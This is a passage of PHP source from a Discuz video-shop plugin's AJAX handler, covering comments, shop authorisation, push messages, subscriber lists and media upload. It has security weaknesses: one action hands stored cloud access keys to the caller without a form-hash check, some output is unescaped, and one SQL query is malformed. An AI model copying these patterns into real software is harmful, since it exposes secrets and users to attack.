	foreach($it618_video_goods_video_pls as $it618_video_goods_video_pl) {

		$username=it618_video_getusername($it618_video_goods_video_pl['it618_uid']);
		
		if($isshop==1||in_array($uid, $video_shopadmin)){
			$strtmpdel='<a href="javascript:" style="float:right" onclick="if(confirm(\''.it618_video_getlang('t372').'\'))delpl(\''.$it618_video_goods_video_pl['id'].'\')">'.it618_video_getlang('t373').'</a><a href="javascript:" style="float:right;margin-right:6px" onclick="hfpl(\''.$it618_video_goods_video_pl['id'].'\')">'.it618_video_getlang('s772').'</a>';
		}
		
		$it618_hfcontent='';
		if($it618_video_goods_video_pl['it618_hfcontent']!=''){
			$it618_hfcontent='<div class="hfplcontent"><span>'.$it618_video_lang['t345'].'</span>'.str_replace('[br]','<br>',dhtmlspecialchars($it618_video_goods_video_pl['it618_hfcontent'])).'</div>';
		}

		$pl_get.='<tr><td class="tdimg"><img src="'.it618_video_discuz_uc_avatar($it618_video_goods_video_pl['it618_uid'],'small').'" class="pluserimg" /></td><td>
					<div class="pluser"><span class="spanuser">'.$username.'</span> <span class="pltime">'.date('Y-m-d H:i:s', $it618_video_goods_video_pl['it618_time']).'</span>'.$strtmpdel.'</div>
					<div class="plcontent">'.str_replace('[br]','<br>',dhtmlspecialchars($it618_video_goods_video_pl['it618_content'])).'</div>
					'.$it618_hfcontent.'
				  </td></tr>';
	}
	
	echo $pl_get."it618_split".$multipage."it618_split".$count;
}


if($_GET['ac']=="note_save"){
	if($uid<=0){
		echo it618_video_getlang('s485');
	}else{
		if($it618_video_play_pj=C::t('#it618_video#it618_video_play_pj')->fetch_by_pid_uid($_GET['pid'],$uid)){
			C::t('#it618_video#it618_video_play_pj')->update($it618_video_play_pj['id'],array(
				'it618_notecontent' => it618_video_utftogbk($_GET['notecontent'])
			), true);

			echo it618_video_getlang('t756');
		}else{
			echo it618_video_getlang('s513');
		}
	}
	exit;
}


if($_GET['ac']=="payok"){
	
	if($_GET['ac1']=="pay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_video_sale')." WHERE it618_state!=0 and id=".intval($_GET['saleid']));
	}
	if($_GET['ac1']=="gwcpay"){
		$salecount=DB::result_first("SELECT count(1) FROM ".DB::table('it618_video_gwcsale_main')." WHERE it618_state=!=0 and id=".intval($_GET['saleid']));
	}
	
	if($salecount>0){
		echo 'it618_splitok';exit;
	}
}


if($_GET['ac']=="tx_add"||$_GET['ac']=="tx_del"||$_GET['ac']=="tx_get"||$_GET['ac']=="savegoodsstate"||$_GET['ac']=="gwclist_editprice"||$_GET['ac']=="save_editprice"||$_GET['ac']=="state_editprice"||$_GET['ac']=="sale_get"||$_GET['ac']=="sale_dao"||$_GET['ac']=="km_dao"||$_GET['ac']=="salekm_get"||$_GET['ac']=="salekm_dao"||$_GET['ac']=="video_dao"||$_GET['ac']=="play_get"||$_GET['ac']=="playsum_get"||$_GET['ac']=="playsum_dao"||$_GET['ac']=="shoppl_get"||$_GET['ac']=="play_dao"||$_GET['ac']=="getmediacode"||$_GET['ac']=="addmedia"||$_GET['ac']=="addmediaaudio"||$_GET['ac']=="shopgoods_get"||$_GET['ac']=="shopsubscribe_get"||$_GET['ac']=="addpush"||$_GET['ac']=="pushmessage"||$_GET['ac']=="sc"){
	if(!($_GET['ac']=="getmediacode"||$_GET['ac']=="addmedia"||$_GET['ac']=="addmediaaudio")){
		if($_GET['formhash']!=FORMHASH)exit;
	}
	
	if($uid<=0){
		echo it618_video_getlang('s485');exit;
	}else{
		if(isset($_GET['adminsid'])){
			$shopadmin=explode(",",$it618_video['video_shopadmin']);
			if(in_array($_G['uid'],$shopadmin)){
				if(!$it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($_GET['adminsid'])){
					echo it618_video_getlang('s338');exit;
				}
			}
		}else{
			if(!$it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_uid($_G['uid'])){
				echo it618_video_getlang('s338');exit;
			}
			
			$pid=intval($_GET['pid']);
			if($pid>0){
				if($it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($pid)){
					if($it618_video_goods['it618_shopid']!=$it618_video_shop['id']){
						echo it618_video_getlang('s513');exit;
					}
				}
			}
			
			$lid=intval($_GET['lid']);
			if($lid>0){
				if($it618_video_goods_lesson = C::t('#it618_video#it618_video_goods_lesson')->fetch_by_id($lid)){
					$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_goods_lesson['it618_pid']);
					if($it618_video_goods['it618_shopid']!=$it618_video_shop['id']){
						echo it618_video_getlang('s513');exit;
					}
				}
			}
			
			$typeid=intval($_GET['typeid']);
			if($typeid>0){
				if($it618_video_goods_type = C::t('#it618_video#it618_video_goods_type')->fetch_by_id($typeid)){
					$it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_video_goods_type['it618_pid']);
					if($it618_video_goods['it618_shopid']!=$it618_video_shop['id']){
						echo it618_video_getlang('s513');exit;
					}
				}
			}
		}
				
		$it618_state=$it618_video_shop['it618_state'];
		if($it618_state==0){
			echo it618_video_getlang('s334');exit;
		}elseif($it618_state==1){
			echo it618_video_getlang('s335');exit;
		}else{
			$it618_htstate=$it618_video_shop['it618_htstate'];
			if($it618_htstate==0){
				echo it618_video_getlang('s336');exit;
			}elseif($it618_htstate==2){
				echo it618_video_getlang('s337');exit;
			}else{
				$ShopId=$it618_video_shop['id'];
				$ShopUId=$it618_video_shop['it618_uid'];
				$ShopName=$it618_video_shop['it618_name'];
				$ShopIsCheck=$it618_video_shop['it618_ischeck'];
				$ShopIsCheckAudio=$it618_video_shop['it618_ischeck_audio'];
				$ShopTCBL=$it618_video_shop['it618_tcbl'];
				$Shopisale=$it618_video_shop['it618_issale'];
				$Shopischeck_live=$it618_video_shop['it618_ischeck_live'];
			}
		}
	}

}

if($_GET['ac']=="setliveetime"){
	$liveid=intval($_GET['liveid']);
	if($it618_video_live = C::t('#it618_video#it618_video_live')->fetch_by_id($liveid)){
		if($it618_video_live['it618_liveset_id']==0){
			C::t('#it618_video#it618_video_live')->update($it618_video_live['id'],array(
				'it618_etime' => $_G['timestamp'],
				'it618_livetime' => ($_G['timestamp']-$it618_video_live['it618_btime'])/60,
				'it618_isok' => 1
			));
			it618_video_deletegoodsvideo($it618_video_live['id']);
			echo 'okit618_split'.it618_video_getlang('s1756');
			exit;
		}
					
		if($it618_video_live['it618_iseditetime']==1){
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			C::t('#it618_video#it618_video_live')->update($liveid,array(
				'it618_etime' => $_G['timestamp'],
				'it618_livetime' => ($_G['timestamp']-$it618_video_live['it618_btime'])/60
			));
			it618_video_updatevideolive($it618_video_live,'btn');
			echo 'okit618_split'.it618_video_getlang('s1756');
			exit;
		}
	}
	
	echo $it618_video_lang['s513'];
	exit;
}

if($_GET['ac']=="sc"){
	require_once DISCUZ_ROOT.'./source/plugin/it618_video/ajax_sc.func.php';
}

if($_GET['ac']=="addpush"){
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_video/config/message.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_video/config/message.php';
	}
	
	$it618_message=it618_video_utftogbk($_GET['it618_message']);
	
	$istelmessage=1;
	if($it618_isok==1&&$it618_body_push_user_isok==1){
		if($it618_body_push_user!=''&&$it618_length>0){
			if($it618_body_push_user_tplid_wxsms!=''){
				if($_GET['istelmessage']==1){
					$ischeck=1;
				}else{
					$istelmessage=0;
				}
			}else{
				$ischeck=1;
			}
			
			if($ischeck==1){
				if(cutstr($it618_message,$it618_length,'')!=$it618_message){
					$it618_video_lang['s1943']=str_replace('{lenght}',$it618_length,$it618_video_lang['s1943']);
					echo 'it618_split'.$it618_video_lang['s1943'];exit;
				}
			}
		}
		
		if(cutstr($it618_message,150,'')!=$it618_message){
			$it618_video_lang['s1950']=str_replace('{lenght}',150,$it618_video_lang['s1950']);
			echo 'it618_split'.$it618_video_lang['s1950'];exit;
		}
	}else{
		echo 'it618_split'.$it618_video_lang['s1939'];exit;
	}
	
	$tomonth = date('n'); 
	$todate = date('j'); 
	$toyear = date('Y');
	$time=mktime(0, 0, 0, $tomonth, $todate, $toyear);
	$count = DB::result_first("SELECT count(1) FROM ".DB::table('it618_video_shop_push')." where it618_time>=$time and it618_shopid=$ShopId");
		
	if($count<$it618_video_shop['it618_wxmessagecount']){
		$n=1;
		foreach(C::t('#it618_video#it618_video_shop_subscribe')->fetch_all_by_search($ShopId,'','it618_time desc',0,0,100000) as $it618_video_shop_subscribe) {
			$u_avatarimg=it618_video_discuz_uc_avatar($it618_video_shop_subscribe['it618_uid'],'middle');
			$subscribe_get.='<tr class="hover">
						<td><a href="'.it618_video_rewriteurl($it618_video_shop_subscribe['it618_uid']).'" target="_blank"><img src="'.$u_avatarimg.'" width=28 style="vertical-align:middle"></a> <a href="'.it618_video_rewriteurl($it618_video_shop_subscribe['it618_uid']).'" target="_blank">'.it618_video_getusername($it618_video_shop_subscribe['it618_uid']).'('.$it618_video_shop_subscribe['it618_uid'].')</a><input type="hidden" id="user'.$n.'" value="'.$it618_video_shop_subscribe['it618_uid'].'"></td>
						<td id="tduser'.$n.'"></td>
						</tr>';
			$n=$n+1;	
		}
		
		$n=$n-1;
		$id=C::t('#it618_video#it618_video_shop_push')->insert(array(
			'it618_shopid' => $ShopId,
			'it618_url' => $_GET['it618_url'],
			'it618_message' => $it618_message,
			'it618_istelmessage' => $it618_istelmessage,
			'it618_allcount' => $n,
			'it618_time' => $_G['timestamp']
		), true);
		
		echo 'it618_splitokit618_split'.$id.'it618_split'.$n.'it618_split'.$subscribe_get;exit;
	}else{
		$it618_video_lang['s1923']=str_replace("{count}",$it618_video_shop['it618_wxmessagecount'],$it618_video_lang['s1923']);
		echo 'it618_split'.$it618_video_lang['s1923'];exit;
	}
	exit;
}

if($_GET['ac']=="pushmessage"){	
	$pushid=intval($_GET['pushid']);
	$uid=intval($_GET['uid']);
	$i=intval($_GET['i']);

	if($it618_video_shop_push=C::t('#it618_video#it618_video_shop_push')->fetch_by_id($pushid)){
		$return=it618_video_sendmessage('push_user',$pushid,$uid);
		if($return==1){
			echo 'it618_split'.$i.'it618_splitokit618_split<font color=#390>'.$it618_video_lang['s1924'].'</font>';exit;
		}
		if($return==2){
			echo 'it618_split'.$i.'it618_splitokit618_split<font color=#390>'.$it618_video_lang['s1925'].'</font>';exit;
		}
		echo 'it618_split'.$i.'it618_splitit618_split<font color=red>'.$it618_video_lang['s1926'].'</font>';exit;
	}else{
		echo 'it618_split'.$i.'it618_splitit618_split<font color=red>'.$it618_video_lang['s513'].'</font>';exit;
	}
	exit;
}


if($_GET['ac']=="shopsubscribe_get"){
	if($_GET['ac1']=='pcshopsubscribe')$ppp = 12;
	if($_GET['ac1']=='wapshopsubscribe')$ppp = 15;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$count=C::t('#it618_video#it618_video_shop_subscribe')->count_by_search($ShopId,'','it618_time desc',$_GET['finduid']);
	
	$funname='getshopsubscribelist';
	
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/kindeditor/plugins/image/images/it618.png'))$ismembers=1;

	$n=0;
	foreach(C::t('#it618_video#it618_video_shop_subscribe')->fetch_all_by_search($ShopId,'','it618_time desc',$_GET['finduid'],$startlimit,$ppp) as $it618_video_shop_subscribe) {
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$u_avatarimg=it618_video_discuz_uc_avatar($it618_video_shop_subscribe['it618_uid'],'middle');
		
		if($ismembers==1){
			if($it618_members_wxuser=DB::fetch_first("SELECT * FROM ".DB::table('it618_members_wxuser')." WHERE it618_uid=".$it618_video_shop_subscribe['it618_uid'])){
				if($it618_members_wxuser['it618_wxok']==0){
					$wxstr=$it618_video_lang['s1383'];
				}else{
					$wxstr=$it618_video_lang['s1382'];
				}
			}else{
				$wxstr=$it618_video_lang['s1384'];
			}
		}
		
		if($it618_video_shop_subscribe['it618_tel']==''){
			$telstr=$it618_video_lang['s1948'];
		}else{
			$telstr=$it618_video_shop_subscribe['it618_tel'];
		}
		
		if($_GET['ac1']=='pcshopsubscribe'){
			
			if($ismembers==1)$tmpstr='<td>'.$wxstr.'</td>';
			
			$subscribe_get.='<tr class="hover">
						<td><a href="'.it618_video_rewriteurl($it618_video_shop_subscribe['it618_uid']).'" target="_blank"><img src="'.$u_avatarimg.'" width=28 style="vertical-align:middle"></a> <a href="'.it618_video_rewriteurl($it618_video_shop_subscribe['it618_uid']).'" target="_blank">'.it618_video_getusername($it618_video_shop_subscribe['it618_uid']).'('.$it618_video_shop_subscribe['it618_uid'].')</a></td>
						'.$tmpstr.'
						<td>'.$telstr.'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_video_shop_subscribe['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapshopsubscribe'){
			$subscribe_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="80" style="vertical-align:top;border:none">
							<img class="lazy" data-original="'.$u_avatarimg.'" style="border-radius: 3px;" width="70" height="70"/>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							'.it618_video_getusername($it618_video_shop_subscribe['it618_uid']).'('.$it618_video_shop_subscribe['it618_uid'].')<br>
							'.$wxstr.'<br>'.$telstr.'<br>
							<font color=#999><font color=#999>'.date('Y-m-d H:i:s', $it618_video_shop_subscribe['it618_time']).'</font></font>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcshopsubscribe'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_video_getlang('s1405')."<font color=red>$count</font>"."it618_split".$subscribe_get."it618_split".$multipage;
}


if($_GET['ac']=="getshopgoods"){
	echo it618_video_getshopgoods($_GET['shopid'],$_GET['page'],$_GET['wap'],$_GET['orderby']);
}



if($_GET['ac']=="getmediacode"){
	if($it618_video_mediawork=C::t('#it618_video#it618_video_mediawork')->fetch_by_it618_code($_GET['code'])){
		
		C::t('#it618_video#it618_video_mediawork')->delete_by_id($it618_video_mediawork['id']);
		
		if(isset($_GET['wid'])){
			$it618_video_media_wmf=C::t('#it618_video#it618_video_media_wmf')->fetch_by_id($_GET['wid']);
			$accessid=$it618_video_media_wmf['it618_accessid'];
			$accesskey=$it618_video_media_wmf['it618_accesskey'];
			$endpoint=$it618_video_media_wmf['it618_endpoint'];
			$wmfpath=$it618_video_media_wmf['it618_wmfpath'];
			
			$tmparr=explode("/",$wmfpath);
			
			$host='https://'.$tmparr[0].'.'.$endpoint.'/';
			
			echo 'it618_split'.$accessid.'it618_split'.$accesskey.'it618_split'.$tmparr[1].'/it618_split'.$host;
		}else{
			$it618_video_media_aoss=C::t('#it618_video#it618_video_media_aoss')->fetch_by_id($_GET['oid']);
			$accessid=$it618_video_media_aoss['it618_accessid'];
			$accesskey=$it618_video_media_aoss['it618_accesskey'];
			$endpoint=$it618_video_media_aoss['it618_endpoint'];
			$bucket=$it618_video_media_aoss['it618_bucket'];
			
			$host='https://'.$bucket.'.'.$endpoint.'/';
			
			echo 'it618_split'.$accessid.'it618_split'.$accesskey.'it618_splitit618_split'.$host;
		}
	}

	exit;
}


if($_GET['ac']=="addmedia"){
	
	$it618_video_media_wmf=C::t('#it618_video#it618_video_media_wmf')->fetch_by_id($_GET['wid']);
	
	$endpoint=$it618_video_media_wmf['it618_endpoint'];
	$wmfpath=$it618_video_media_wmf['it618_wmfpath'];
	
	$wmfarr=explode("/",$wmfpath);
	$url='http://'.$wmfarr[0].'.'.$endpoint.'/'.$wmfarr[1].'/shop'.$ShopId.'/'.$_GET['code'].'/'.$_GET['name'];
	
	$count=C::t('#it618_video#it618_video_media')->count_by_url($url);
	if($count==0){
		
		if($ShopIsCheck==1)$it618_chkstate=0;else $it618_chkstate=1;
		$id=C::t('#it618_video#it618_video_media')->insert(array(
			'it618_shopid' => $ShopId,
			'it618_class_id' => $_GET['classid'],
			'it618_wmf_id' => $_GET['wid'],
			'it618_endpoint' => $endpoint,
			'it618_name' => it618_video_utftogbk($_GET['medianame']),
			'it618_url' => $url,
			'it618_chkstate' => $it618_chkstate,
			'it618_time' => $_G['timestamp']
		), true);
		
		echo 'it618_splitokit618_split';
	}
	exit;
}


if($_GET['ac']=="addmediaaudio"){

	$it618_video_media_aoss=C::t('#it618_video#it618_video_media_aoss')->fetch_by_id($_GET['oid']);
	
	$endpoint=$it618_video_media_aoss['it618_endpoint'];
	$bucket=$it618_video_media_aoss['it618_bucket'];
	
	if($_GET['osstype']==0){
		$osspath='audiomedia/';
	}
	if($_GET['osstype']==1){
		$osspath='videomedia/';
	}
	if($_GET['osstype']==2){
		$osspath='attachmedia/';
	}
	
	$url='http://'.$bucket.'.'.$endpoint.'/'.$osspath.'shop'.$ShopId.'/'.$_GET['code'].'/'.$_GET['name'];
	
	$count=C::t('#it618_video#it618_video_media_audio')->count_by_url($url);
	if($count==0){
		
		$urlext=pathinfo($url, PATHINFO_EXTENSION);
		
		if($ShopIsCheckAudio==1)$it618_chkstate=0;else $it618_chkstate=1;
		$id=C::t('#it618_video#it618_video_media_audio')->insert(array(
			'it618_shopid' => $ShopId,
			'it618_aclass_id' => $_GET['classid'],
			'it618_aoss_id' => $_GET['oid'],
			'it618_endpoint' => $endpoint,
			'it618_osstype' => $_GET['osstype'],
			'it618_name' => it618_video_utftogbk($_GET['medianame']),
			'it618_url' => $url,
			'it618_ext' => $urlext,
			'it618_chkstate' => $it618_chkstate,
			'it618_size' => $_GET['mediasize'],
			'it618_time' => $_G['timestamp']
		), true);
		
		$it618_mediacount=C::t('#it618_video#it618_video_media_audio')->count_by_aoss_id($_GET['oid']);
		$it618_mediasize=C::t('#it618_video#it618_video_media_audio')->sum_size_by_aoss_id($_GET['oid']);
		
		C::t('#it618_video#it618_video_media_aoss')->update($_GET['oid'],array(
			'it618_mediacount' => $it618_mediacount,
			'it618_mediasize' => ($it618_mediasize/1024/1024),
		));
		
		echo 'it618_splitokit618_split';
	}
	exit;
}


if($_GET['ac']=="home_goods"){
	if($template_set['homegoodscatchtime']>0){
		if($_GET['wap']!=1){
			$cache_file = DISCUZ_ROOT.'./source/plugin/it618_video/cache_pchome_'.$templatename.'.php';
			if(($_G['timestamp'] - @filemtime($cache_file)) > $template_set['homegoodscatchtime']*60) {
				$str_goods=it618_video_template_pchomeclassgoods($templatename);
				@$fp = fopen($cache_file,"w");
				fwrite($fp,$str_goods);
				fclose($fp);
			}
		}else{
			if($it618_video['video_style']>2){
				$videostyle=getcookie('videostyle');
				if($videostyle==''){
					if($it618_video['video_style']==3)$videostyle='1';else $videostyle='2';
				}
			}else{
				if($it618_video['video_style']==1)$videostyle='1';else $videostyle='2';
			}
			
			$cache_file = DISCUZ_ROOT.'./source/plugin/it618_video/cache_waphome'.$videostyle.'.php';
			if(($_G['timestamp'] - @filemtime($cache_file)) > $template_set['homegoodscatchtime']*60) {
				$str_goods=it618_video_template_waphomegoods($videostyle);
				@$fp = fopen($cache_file,"w");
				fwrite($fp,$str_goods);
				fclose($fp);
			}
		}
	}
	
	$home_goods=C::t('#it618_video#it618_video_set')->getsetvalue_by_setname($_GET['ac1']);
	
	$tmparr=explode(",",$home_goods);
	if($_GET['wap']!=1){
		if(count($tmparr)>2){
			$goods_count=$tmparr[0];
		}else{
			$goods_count=15;
		}
	}else{
		if(count($tmparr)>2){
			$goods_count=$tmparr[1];
		}else{
			$goods_count=8;
		}
	}
	
	if($_GET['ac1']=='zjsalegoods'){
		if($IsPinEdu==1){
			$query = DB::query("SELECT p.it618_pid FROM ".DB::table('it618_pinedu_goods')." p left join ".DB::table('it618_video_goods')." g on p.it618_pid=g.id and p.it618_shoptype='video'and UNIX_TIMESTAMP(it618_time2)>".$_G['timestamp']." left join ".DB::table('it618_video_shop')." b on g.it618_shopid=b.id where g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 GROUP BY p.it618_pid ORDER BY g.it618_plays desc limit 0,".$goods_count);
		}else{
			$query = DB::query("SELECT max(m.id) as maxid,m.it618_pid FROM ".DB::table('it618_video_sale')." m left join ".DB::table('it618_video_goods')." g on m.it618_pid=g.id and m.it618_state>0 left join ".DB::table('it618_video_shop')." b on g.it618_shopid=b.id where g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 and m.it618_pid>0 GROUP BY m.it618_pid ORDER BY maxid desc limit 0,".$goods_count);
		}
	}
	
	if($_GET['ac1']=='weeksalegoods'){
		$query = DB::query("SELECT id as it618_pid from ".DB::table('it618_video_goods')." where it618_xgtype>0 and UNIX_TIMESTAMP(it618_xgtime2)>".$_G['timestamp']." order by it618_xgtime2 limit 0,".$goods_count);
	}
	
	if($_GET['ac1']=='newgoods'){
		$query = DB::query("SELECT g.id as it618_pid FROM ".DB::table('it618_video_goods')." g left join ".DB::table('it618_video_shop')." b on g.it618_shopid=b.id where g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 ORDER BY g.id desc limit 0,".$goods_count);
	}
	
	if($_GET['ac1']=='hotgoods'){
		$query = DB::query("SELECT g.id as it618_pid FROM ".DB::table('it618_video_goods')." g left join ".DB::table('it618_video_shop')." b on g.it618_shopid=b.id where g.it618_state=1 and b.it618_state=2 and b.it618_htstate=1 ORDER BY g.it618_views desc limit 0,".$goods_count);
	}
	
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/lang.func.php';
		
	}
	
	if($_GET['wap']!=1){
		$i=1;
		$home_goodstmp='';
		while($it618_homegoods = DB::fetch($query)) {
			$it618_video_goods=C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_homegoods['it618_pid']);
			
			if(!it618_video_issecretok($it618_video_goods)){
				continue;
			}
		
			if($it618_video_goods['it618_state']==1){
				
				if($templatename=='edu'){
					if($i%5==1)$home_goodstmp.='<li class="swiper-slide">';
					
					$it618_video_shop = DB::fetch_first("SELECT * FROM ".DB::table('it618_video_shop')." WHERE id=".$it618_video_goods['it618_shopid']);
					
					$pricestr='<span style="color:#f60;font-size:13px">'.$it618_video_lang['s1534'].'</span>';
					if($it618_video_shop['it618_issale']==1){
						if($it618_video_goods['it618_saleprice']>0||$it618_video_goods['it618_score']>0){
							$pricestr='<span class="price">'.it618_video_getgoodsprice($it618_video_goods,'goods_price').'</span>';
						}else{
							$pricestr='<span style="color:#390;">'.$it618_video_lang['s106'].'</span>';
						}
					}
					
					$it618_isvip='';
					$vipgroupids=it618_video_getgoodsvipgroupids($it618_video_goods);
					if(count($vipgroupids)>0){
						$it618_isvip='<img src="source/plugin/it618_video/images/vip.png" style="vertical-align:middle;margin-top:-3px;margin-right:3px">';
					}
					
					if($_GET['ac1']=='zjsalegoods'){
						if($IsPinEdu==1){
							if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_price_by_it618_shoptype_pid('video',$it618_video_goods['id'])){
								if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_score_by_it618_shoptype_pid('video',$it618_video_goods['id'])){
								}
							}
							$it618_pinedu_goods['it618_saleprice']=$it618_pinedu_goods['it618_price'];
							$pricestr='<img src="source/plugin/it618_pinedu/images/goodspin.png" style="height:20px; margin-right:6px;margin-top:1px;float:left"><span class="price">'.it618_video_getgoodsprice($it618_pinedu_goods,'goods_price').'</span>';
							$it618_isvip='';
						}
					}
					
					$it618_islive='';
					if(C::t('#it618_video#it618_video_live')->count_by_pid_ok($it618_video_goods['id'])>0){
						$it618_islive='<img src="source/plugin/it618_video/images/live.gif" class="imglive">';
					}
					
					$jfbl='';
					if($it618_video_goods['it618_jfbl']>0&&$it618_video_goods['it618_saleprice']>0){
						//$jfbl='<div class="divjfbl">'.$it618_video_lang['s1371'].str_replace(".00","",$it618_video_goods['it618_jfbl']).'%'.$creditname.'</div>';
					}
					
					$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
					$home_goodstmp.='<div class="course-card" title="'.$it618_video_goods['it618_name'].'">
										'.$jfbl.$it618_islive.'
										<div class="course-img">
											<a href="'.$tmpurl.'" target="_blank"><img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" alt="'.$it618_video_goods['it618_name'].'" class="goodsimg"></a>
											<div class="course-name">
												<a href="'.$tmpurl.'" target="_blank">'.cutstr($it618_video_goods['it618_name'],48,'...').'</a>
											</div>
											<div class="course-author">
												'.$it618_isvip.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).'
												<a href="'.$tmpurl.'" target="_blank" title="'.$it618_video_shop['it618_name'].'">'.cutstr($it618_video_shop['it618_name'],14,'...').'</a>
											</div>
											<div class="course-price">
												'.$pricestr.'
												<span class="course-plays">'.$it618_video_goods['it618_plays'].''.it618_video_getlang('s931').'</span>
											</div>
										</div>
									</div>';
				}
				
				if($templatename=='mall'){
					if($i%5==1){$home_goodstmp.='<li>';$noml=' noml';}else{$noml='';}
					
					$it618_video_shop = DB::fetch_first("SELECT * FROM ".DB::table('it618_video_shop')." WHERE id=".$it618_video_goods['it618_shopid']);
					
					$pricestr='<span class="price" style="color:#f30;font-size:20px">'.$it618_video_lang['s1534'].'</span>';
					if($it618_video_shop['it618_issale']==1){
						if($it618_video_goods['it618_saleprice']>0||$it618_video_goods['it618_score']>0){
							$pricestr='<span class="price" style="padding:0;padding-right:3px">'.it618_video_getgoodsprice($it618_video_goods,'goods_price').'</span>';
						}else{
							$pricestr='<span class="price" style="color:#390;font-size:20px">'.$it618_video_lang['s106'].'</span>';
						}
					}
					
					$it618_isvip='';
					$vipgroupids=it618_video_getgoodsvipgroupids($it618_video_goods);
					if(count($vipgroupids)>0){
						$it618_isvip='<img src="source/plugin/it618_video/images/vip.png" style="vertical-align:middle;margin-top:-3px;margin-right:3px">';
					}
					
					if($_GET['ac1']=='zjsalegoods'){
						if($IsPinEdu==1){
							if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_price_by_it618_shoptype_pid('video',$it618_video_goods['id'])){
								if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_score_by_it618_shoptype_pid('video',$it618_video_goods['id'])){
								}
							}
							$it618_pinedu_goods['it618_saleprice']=$it618_pinedu_goods['it618_price'];
							$pricestr='<img src="source/plugin/it618_pinedu/images/goodspin.png" style="height:20px; margin-right:6px;margin-top:1px;float:left"><span class="price" style="color:red">'.it618_video_getgoodsprice($it618_pinedu_goods,'goods_price').'</span>';
							$it618_isvip='';
						}
					}
					
